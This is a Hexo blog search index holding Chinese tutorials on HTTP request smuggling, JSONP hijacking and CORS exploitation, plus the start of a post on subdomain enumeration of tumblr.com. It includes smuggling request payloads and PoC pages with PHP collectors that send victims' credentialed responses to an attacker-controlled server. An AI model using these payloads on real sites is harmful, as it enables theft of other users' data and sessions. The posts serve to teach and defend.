<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HTTP请求走私</title>
      <link href="/2019/12/12/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
      <url>/2019/12/12/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=459782526&auto=0&height=66"></iframe><h2 id="HTTP请求走私（HTTP-Request-Smuggler）"><a href="#HTTP请求走私（HTTP-Request-Smuggler）" class="headerlink" title="HTTP请求走私（HTTP Request Smuggler）"></a>HTTP请求走私（HTTP Request Smuggler）</h2><p>&#8195;HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。请求走私漏洞本质上通常很关键，它使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。</p><p>&#8195;而产生这种漏洞的原因就是：不同的服务器对RFC标准实现的方式不同，程度不同。这样一来，对同一个HTTP请求，不同的服务器可能会产生不同的处理结果，这样就产生了了安全风险。</p><p>&#8195;我们先补一下基础知识，现如今使用最广泛的HTTP1.1的协议特性为<code>Keep-Alive</code>和<code>Pipeline</code></p><p>&#8195;&#8195;在HTTP1.0之前的协议设计中，客户端每进行一次HTTP请求，就需要与服务器简历一个tcp连接。因现在的web网站页面时由多种资源组成的，我们想要获取一个页面的内容会请求各种各样的资源，这样会导致HTTP服务器的负载开销增大，于是在HTTP1.1中增加了<code>Keep-Alive</code>和<code>Pipeline</code>这两个特性。</p><p>&#8195;&#8195;其中<code>Keep-Alive</code>就是在HTTP请求中增加一个特殊的请求头<code>Connection:Keep-Alive</code>,这样服务器在接收完这次HTTP请求后，不会关闭TCP连接，后面对相同目标服务器的HTTP请求都会用这一个TCP链接，这样就只需要进行一次TCP握手的过程，就可以减少服务器的开销了，还能加快访问速度，而且这个特性在1.1中是默认开启的。</p><p>&#8195;&#8195;后面的<code>Pipeline</code>是可以使客户端像流水线一样发送自己的HTTP请求，不需要等待服务器的响应，服务器接收到请求后，会遵循先入先出的机制，将请求和响应严格对应起来，再将响应发送给客户端。但现在的浏览器默认不会启用<code>Pipeline</code>，而一般的服务器却都提供了对<code>Pipleline</code>的支持</p><p>&#8195;&#8195;我相信大家应该知道反向代理服务器，一般来说这个反向代理服务器与后端的服务器之间会重用TCP链接，当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，转发给后端的服务器后，后端服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分就算是<code>走私的请求</code>，当该部分对正常用户的请求造成影响后，就实现了HTTP请求走私攻击。</p><h2 id="CL不为0的GET请求"><a href="#CL不为0的GET请求" class="headerlink" title="CL不为0的GET请求"></a>CL不为0的GET请求</h2><p>&#8195;假设前端代理服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的Content-Length头，不进行处理，这就可能导致请求走私。</p><p>&#8195;比如我们构造请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: 44\r\n</span><br><span class="line"></span><br><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>&#8195;当前端服务器收到这样的请求后，通过读取Content-Length，会判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对Content-length进行处理，由于<code>Pipeline</code>的存在，它就会认为这是收到了两个请求，分别是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一个</span><br><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line"></span><br><span class="line">第二个</span><br><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure><p>&#8195;这样就导致了请求走私</p><h2 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h2><p>&#8195;有的服务器因不严格的实现RFC7230的第3.3.3节中的第四条规定（规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误）导致攻击者可以构造一个特殊的请求。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Content-Length: 8\r\n</span><br><span class="line">Content-Length: 7\r\n</span><br><span class="line"></span><br><span class="line">12345\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p>&#8195;此时代理服务器会按照第一个Content-Length的值对请求进行处理，后端服务器按照第二个Content-Length值进行处理，当后端服务器读取完前7个字符后就会认为读取完毕，然后生成对应的响应，发送出去，而此时的缓冲区还剩下一个字母<code>a</code>，对后端服务器来说，这个<code>a</code>是下一个请求的一部分，但是还没有传输完，此时恰巧有一个正常用户对服务器进行了请求，例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure><p>&#8195;这个时候正常用户的请求就拼接到了字母<code>a</code>的后面，当后端服务器接收完毕后，它实际处理的请求其实是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br></pre></td></tr></table></figure><p>&#8195;这样的话用户就会收到报错，这样就实现了一次HTTP请求走私攻击，而且还对正常用户行为造成了影响</p><h2 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h2><p>&#8195;所谓<code>CL-TE</code>，就是当收到存在两个请求头的请求包时，前端代理服务器只处理<code>Content-Length</code>这一请求头，而后端服务器会遵守<code>RFC2616</code>的规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>这一请求头。</p><p>&#8195;构造数据包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Connection: keep-alive\r\n</span><br><span class="line">Content-Length: 6\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure><p>&#8195;连续发送几次请求就会返回403的响应，内容为“Unrecognized method <code>G</code>POST”</p><p><img src="/images/CLTE5.png" alt="CLTE"></p><p>&#8195;造成这样的原因很简单，就是由于前段服务器处理Content-Length时认为这是一个完整的请求，请求长度为6，也就是<code>0\r\n\r\nG</code>.但是上面内个请求包转发给后端服务器时，后端服务器处理<code>Transfer-Encoding</code>,当它读取到<code>0\r\n\r\n</code>时就认为结束了，剩下的内个字母<code>G</code>就留在了缓冲区，等后面的请求来了以后，在后端服务器就会拼接成类似下面的这种请求。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">Host: .......\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>&#8195;这样服务器在解析时就会产生报错了。你可以自己尝试一下：<code>https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</code></p><h2 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h2><p>&#8195;所谓<code>TE-CL</code>，就是当收到存在两个请求头的请求包时，前端代理服务器处理<code>Transfer-Encoding</code>这一请求头，而后端服务器处理<code>Content-Length</code>请求头。</p><p>&#8195;<code>Transfer-Encoding</code>就是分块传输的标志，<code>分块长度是以16进制表示</code>。</p><p>&#8195;构造数据包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Content-Length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">12\r\n</span><br><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>&#8195;由于前端服务器处理<code>Transfer-Encoding</code>,他先读取第一个分块儿为18个字符，因为16进制的12就是18，第一个分块儿为<code>GPOST/HTTP/1.1rnrn</code>一共18个字符，然后读取第二个数据块，该数据块的长度为0，因此视为终止请求。这个请求转发到后端服务器，后端服务器处理Content-Length请求头，请求正文长度为4个字节，当它读取完<code>12\r\n</code>之后，就认为结束了，后面的数据就是留了下来，当另一个人请求时，就成功报错了</p><p><img src="/images/TE-CL.jpg" alt="TE-CL"></p><p>&#8195;一定要注意我在图中标红的位置</p><p>&#8195;实验网址：<code>https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</code></p><h2 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h2><p>&#8195;这个就是当收到存在两个请求头的请求包时，前后端服务器都处理<code>Tansfer-Encoding</code>请求头，这虽然实现了RFC的标准，不过前后端服务器毕竟不是同一种，所有我们就可以对发送请求包中的<code>Transfer-Encoding</code>进行某种混淆操作，从而使其中的一个服务器不处理<code>Transfer-Encoding</code>请求头。</p><p><img src="/images/TETE.png" alt="TETE"></p><p>&#8195;实验网址：<code>https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</code></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>1.<strong>绕过前端安全控制</strong></p><p>&#8195;在平时挖洞的时候我们可能会遇到没有权限访问的目录，这种情况如果是前端服务器不准请求这个目录而后端的web服务器可以请求这个目录，所有我们就可以利用请求走私来<code>CL-TE</code>绕过前端理服务器直接去请求后端服务器。</p><p><img src="/images/CLTE2.png" alt="CLTE2"></p><p>&#8195;根据响应得知需要以管理员身份或者本地登录才可以访问<code>/admin</code>，管理员身份是不可能了，那我们就只有走私一个<code>Host：localhost</code>来告诉服务器我是从本地访问的。</p><p><img src="/images/CLTE3.jpg" alt="CLTE2"></p><p>&#8195;这样我们就成功的访问了admin页面，根据响应包也能看出来如何进行删用户的操作</p><p><img src="/images/CLTE4.png" alt="CLTE2"></p><p>&#8195;我们还可以使用<code>TE-CL</code>来进行绕过限制,跟上面差不多就不多说了，</p><p><img src="/images/TECL2.png" alt="TECL1"></p><p><img src="/images/TECL1.png" alt="TECL1"></p><p>2.<strong>获取前端服务器重写请求字段</strong></p><p>&#8195;有的时候，前端服务器在收到请求后不会直接发送给后端服务器，它会先添加一些字段，然后再转发给后端服务器，在我们攻击的时候如果没有这些字段，攻击就会失败，那我们应该怎么获取内些字段呢，PortSwigger提供了一个简单的方法</p><p>&#8195;<code>找一个能够将请求参数的值输出到响应中的POST请求</code></p><p>&#8195;<code>把该POST请求中找到的这个特殊的参数放在消息的最后面</code></p><p>&#8195;<code>然后走私这一请求，然后直接发送一个普通请求，前端服务器对这个请求重写的字段就会显示出来</code></p><p>&#8195;Okey现在让我们找到一个POST请求，而且在请求包中的参数值还必须在响应包中出现。</p><p><img src="/images/search.png" alt="search"></p><p><img src="/images/CLTE6.png" alt="CLTE6"></p><p>&#8195;我们吧Content-Length这个参数的值弄大点，这样请求走私到后端后端发现数据的总长度应是70，而目前下面的数据还不够70，就会继续等待，等我们下一次发送请求的时候，后端服务器检测到数据总长度够70后就认为传输完毕了，然后就进行了响应，这样我们后面内次正常的请求的一部分与走私请求结合在一起，从响应中表示出来，这样我们就获取了前端服务器的重写字段。</p><p><img src="/images/CLTE7.jpg" alt="CLTE6"></p><p>&#8195;现在我们知道了重写请求，在走私的时候只需要把重写的请求带上就能够执行正常的操作了</p><p><img src="/images/CLTE8.png" alt="CLTE6"></p><p>3.<strong>获取其他用户的请求</strong></p><p>&#8195;想要窃取用户的请求，我们可以走私一个恶意请求，将其他用户的请求的信息拼接到走私请求之后，并存储到网站中，我们再查看这些数据，就能获取到用户的请求了，可利用此方法窃取用户的账号密码等敏感数据。</p><p>&#8195;首先我们需要找到存储的位置，例如评论处</p><p><img src="/images/Comment.png" alt="Comment"></p><p>&#8195;让我们来走个私</p><p><img src="/images/CLTE8.png" alt="CLTE6"></p><p>&#8195;这里走私以后，当用户去访问，就会发表一个评论，并且评论中还带着她请求包中的内容，有的时候会有cookie</p><p>4.<strong>反射型XSS</strong></p><p>&#8195;请求走私与XSS结合的好处就是不需要我们向受害者提供URL，也不用等他们去访问，我们只需要在走私中包含xss负载就可以了，而且我们可以利用HTTP请求头进行xss</p><p><img src="/images/httpxss1.png" alt="httpxss1"></p><p>5.<strong>将现场重定向变为开放重定向</strong></p><p>&#8195;这种攻击场景就是在目标在使用30X跳转的时候，使用了Host头进行跳转，例如Apache&amp;&amp;IIS服务器上，一个URI最后不带/的请求会被30X导向带/的地址。例如发送一下请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /home HTTP/1.1</span><br><span class="line">Host: normal-website.com</span><br></pre></td></tr></table></figure><p>&#8195;得到的Response会是这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 301 Moved Permanently</span><br><span class="line">Location: https://normal-website.com/home/</span><br></pre></td></tr></table></figure><p>&#8195;结合请求走私使他重定向到我们的恶意网站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 54</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /home HTTP/1.1</span><br><span class="line">Host: attacker-website.com</span><br><span class="line">Foo: X</span><br></pre></td></tr></table></figure><p>&#8195;如果服务器根据走私过去的Host进行跳转，就会是以下的响应：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 301 Moved Permanently</span><br><span class="line">Location: https://attacker-website.com/home/</span><br></pre></td></tr></table></figure><p>&#8195;这样就重定向到我们的恶意网站了</p><p>6.<strong>缓存投毒</strong></p><p>&#8195;一般情况下，前端服务器处于性能的原因，会对后端服务器的<code>一些资源进行缓存</code>，如果存在HTTP请求走私漏洞，则有可能通过重定向来进行缓存投毒，从而影响后续访问的所有用户.</p><p>&#8195;我们以下面的js文件为例</p><p><img src="/images/js.png" alt="js"></p><p>&#8195;我们还需要编辑一下投毒的服务器</p><p><img src="/images/du.png" alt="du"></p><p>&#8195;然后我们发送一次走私请求，走私的内段请求时在我们点击下一篇的时候发现的30X重定向，这样我们就能重定向到我们的投毒服务器了</p><p><img src="/images/CLTE10.png" alt="CLTE10"></p><p>&#8195;发送完一次走私请求后，再发送一个GET请求去访问<code>/resources/js/tracking.js</code></p><p><img src="/images/js1.png" alt="js1"></p><p>&#8195;从上面这个图可以发现重定向到我们的投毒服务器了，然后我们访问正常的服务器主页发现响应为缓存在投毒服务器上的文件。</p><p><img src="/images/page.png" alt="page"></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>&#8195;1.禁用代理服务器与后端服务器之间的TCP连接重用。</p><p>&#8195;2.使用HTTP/2协议。</p><p>&#8195;3.前后端使用相同的服务器。</p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>&#8195;写这篇文章前前后后用了3天的时间，借鉴了好多文章，碰到了好多坑，所以在此提醒大家一定要细心，尤其是上面的实验，能用burp的插件就用插件（HTTP Request Smuggler），本文中做的一些实验都在下面的第一个链接中，其余的是我借鉴的文章中一些写的详细的文章。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><code>https://portswigger.net/web-security/request-smuggling/exploiting</code></p><p><code>https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/#Turn-An-On-Site-Redirect-Into-An-Open-Redirect</code></p><p><code>https://paper.seebug.org/1048/#52</code></p><p><code>http://mi0.xyz/2019/11/01/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</code></p>]]></content>
      
      
      <categories>
          
          <category> HTTP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSONP劫持与CORS</title>
      <link href="/2019/12/09/jsonp%E4%B8%8Ecors/"/>
      <url>/2019/12/09/jsonp%E4%B8%8Ecors/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=1335899405&auto=0&height=66"></iframe><h2 id="JSONP？"><a href="#JSONP？" class="headerlink" title="JSONP？"></a>JSONP？</h2><p>&#8195;JSONP就是为了跨域获取资源而产生的一种技术手段，这种技术是利用<code>script</code>和<code>src</code>属性不受同源策略影响的特性。（所谓同源是指，域名，协议，端口相同）</p><h2 id="JSONP劫持"><a href="#JSONP劫持" class="headerlink" title="JSONP劫持"></a>JSONP劫持</h2><p>&#8195;jsonp劫持就是攻击者获取到网站本应传给其他接口的一些敏感数据。如果网站B对网站A的JSONP请求没有进行安全检查直接返回数据，则网站B 便存在JSONP 漏洞，网站A 利用JSONP漏洞就能够获取用户在网站B上的数据。</p><h2 id="JSONP漏洞利用"><a href="#JSONP漏洞利用" class="headerlink" title="JSONP漏洞利用"></a>JSONP漏洞利用</h2><p>&#8195;我们在burpsuite里进行搜索回调函数<code>callback</code>，然后把它发送到Response</p><p><img src="/images/jsonp3.png" alt="jsonp"></p><p><img src="/images/jsonp1.png" alt="jsonp"></p><p>&#8195;我们尝试更改<code>callback</code>这个参数值为aaa</p><p><img src="/images/jsonp2.png" alt="jsonp"></p><p>&#8195;这里可以看见我在Response里标红的位置已经根据咱们更改的参数值而改变，就证明参数可控，也就是说存在漏洞，而且返回的也是一些敏感数据，okay，接下来就让我们在自己的服务器上写个脚本，当受害者访问的时候，我们就能获取这些数据了。</p><p>&#8195;<strong>poc</strong></p><p>&#8195;&#8195;js.html(受害者访问此页面)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;meta name=”referrer” content=”no-referrer”&gt;&lt;/head&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;./jquery.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function test(json)&#123;</span><br><span class="line">    //alert(v.name);</span><br><span class="line">data=JSON.stringify(json)</span><br><span class="line">    var xmlhttp = new XMLHttpRequest();</span><br><span class="line">    var url = &apos;http://hacker web server ip/jsonp/logs.php?name=&apos;+data;</span><br><span class="line">    xmlhttp.open(&quot;GET&quot;,url,true);</span><br><span class="line">    xmlhttp.send();</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;Vulnerability URL?callback=test&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Welcome&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>&#8195;&#8195;logs.php(保存在攻击者web服务器上)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$nickname=$_GET[&apos;name&apos;];</span><br><span class="line">$fp = fopen(&apos;info.txt&apos;,&apos;a&apos;);</span><br><span class="line">$flag = fwrite($fp, &quot;数据:  &quot;.$nickname.&quot;\r\n&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>&#8195;判断referer来源地址</p><p>&#8195;设置随机且一次性的token</p><h2 id="漏洞挖掘技巧"><a href="#漏洞挖掘技巧" class="headerlink" title="漏洞挖掘技巧"></a>漏洞挖掘技巧</h2><p>&#8195;用burpsuite的搜索功能搜索关键字，</p><p>&#8195;常见的关键字有</p><p>&#8195;&#8195;<code>jsoncallback</code><br>&#8195;&#8195;<code>jsonpcallback</code><br>&#8195;&#8195;<code>jsoncall</code><br>&#8195;&#8195;<code>jsonpcall</code><br>&#8195;&#8195;<code>cb</code><br>&#8195;&#8195;<code>jsoncb</code><br>&#8195;&#8195;<code>jsonpcb</code></p><h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p>&#8195;CORS全称是跨域资源共享，看名字就知道是用于跨域传输数据的，和JSONP差不多，但是这个比内个厉害点，JSONP只支持GET传输数据，CORS则支持所有类型的HTTP请求。</p><h2 id="CORS漏洞利用"><a href="#CORS漏洞利用" class="headerlink" title="CORS漏洞利用"></a>CORS漏洞利用</h2><p>&#8195;跨域资源读取</p><p>&#8195;&#8195;首先我们需要确认是否存在漏洞，如下图红框处所示，当内个字段为*，或者在请求包中添加origin字段，并随便输入一个url，响应包存在内段url的话就证明存在这个漏洞。</p><p><img src="/images/cors.png" alt="cors"></p><p><img src="/images/cors2.png" alt="cors"></p><p>&#8195;&#8195;现在我们可以在服务器上创建一个脚本来跨域读取用户的敏感信息，如cookie、token等</p><p>&#8195;<strong>poc</strong></p><p>&#8195;&#8195;corf.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h1&gt;cors exploit&lt;/h1&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function exploit()</span><br><span class="line">&#123;</span><br><span class="line">    var xhr1;</span><br><span class="line">    var xhr2;</span><br><span class="line">    if(window.XMLHttpRequest)</span><br><span class="line">    &#123;</span><br><span class="line">        xhr1 = new XMLHttpRequest();</span><br><span class="line">        xhr2 = new XMLHttpRequest();</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        xhr1 = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">        xhr2= new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    xhr1.onreadystatechange=function()</span><br><span class="line">    &#123;</span><br><span class="line">        if(xhr1.readyState == 4 &amp;&amp; xhr1.status == 200) </span><br><span class="line">        &#123;</span><br><span class="line">            var datas=xhr1.responseText;</span><br><span class="line">            xhr2.open(&quot;POST&quot;,&quot;http://uip/cors/save.php&quot;,&quot;true&quot;);</span><br><span class="line">            xhr2.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">            xhr2.send(&quot;z0=&quot;+escape(datas));      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr1.open(&quot;GET&quot;,&quot;Vulnerability URL&quot;,&quot;true&quot;) </span><br><span class="line">    xhr1.withCredentials = true;        </span><br><span class="line">    xhr1.send();</span><br><span class="line">&#125;</span><br><span class="line">exploit();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>&#8195;save.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = fopen(&quot;secrect.html&quot;, &quot;w+&quot;);</span><br><span class="line">$res = $_POST[&apos;z0&apos;];</span><br><span class="line">fwrite($file, $res);</span><br><span class="line">fclose($res);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h2><p>&#8195;能不开CORS就不开</p><p>&#8195;定义白名单，严格校验Origin值</p><p>&#8195;仅在接收到跨域请求的时候才配置有关于跨域的头部，确保跨域请求合法</p><h2 id="漏洞挖掘技巧-1"><a href="#漏洞挖掘技巧-1" class="headerlink" title="漏洞挖掘技巧"></a>漏洞挖掘技巧</h2><p>&#8195;打开burpsuite，选择Proxy模块中的options选项，找到Match and Replace 勾选下图中的内个request header，要是没有就自己搞一个。</p><p><img src="/images/cors3.png" alt="cors"></p><p>&#8195;然后再 HTTP history那里搜<code>Access-Control-Allow-Origin: *</code>或者<code>Access-Control-Allow-Origin:foo.example.org</code>或者<code>Access-Control-Allow-Origin:true</code></p><p><img src="/images/cors4.png" alt="cors"></p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>&#8195;大家可以去米斯特公众号找找一个叫敏感信息高亮标记的文章，内个工具装在burpsuite里用着不错的。</p><p>&#8195;如果觉得文章中原理处字少的话，可以看下我下面给的链接。</p><p>本文参考链接</p><p><code>https://www.cnblogs.com/junsec/p/11221943.html</code></p><p><code>https://www.mi1k7ea.com/2019/08/18/CORS%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#Demo</code></p><p><code>https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/</code></p><p><code>http://sh1yan.top/2018/08/12/jsonp-study/</code></p>]]></content>
      
      
      <categories>
          
          <category> csrf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何做信息收集</title>
      <link href="/2019/12/08/%E5%A6%82%E4%BD%95%E5%81%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2019/12/08/%E5%A6%82%E4%BD%95%E5%81%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=1406311852&auto=0&height=66"></iframe><p>收集的网站是：<code>*.tumblr.com</code></p><h2 id="子域收集"><a href="#子域收集" class="headerlink" title="子域收集"></a>子域收集</h2><p>&#8195;1.Sublist3r</p><p><img src="/images/sublist3r.png" alt="sublist3r"></p><p>&#8195;大约过了10多分钟</p><p><img src="/images/sublist3r1.png" alt="sublist3r"></p><p>&#8195;说实话我没想到我随便找的一个看似很小的站却有这么多域名</p><p>&#8195;2.aquatone</p><p>&#8195;&#8195;使用命令<code>amass enum --passive -d tumblr.com -o amass.txt</code>找到了1910个子域名</p><p>&#8195;3.OneForAll</p><p>&#8195;<code>https://github.com/shmilylty/OneForAll</code></p><p>&#8195;&#8195;使用命令<code>python3 oneforall.py --target tumblr.com run --valid=None</code>收集完成后，csv文件会在results目录下，这款工具用着蛮不错的，扫出来5k多</p><p>&#8195;4.ESD</p><p>&#8195;<code>https://github.com/FeeiCN/ESD</code></p><p>&#8195;命令：<code>esd -d 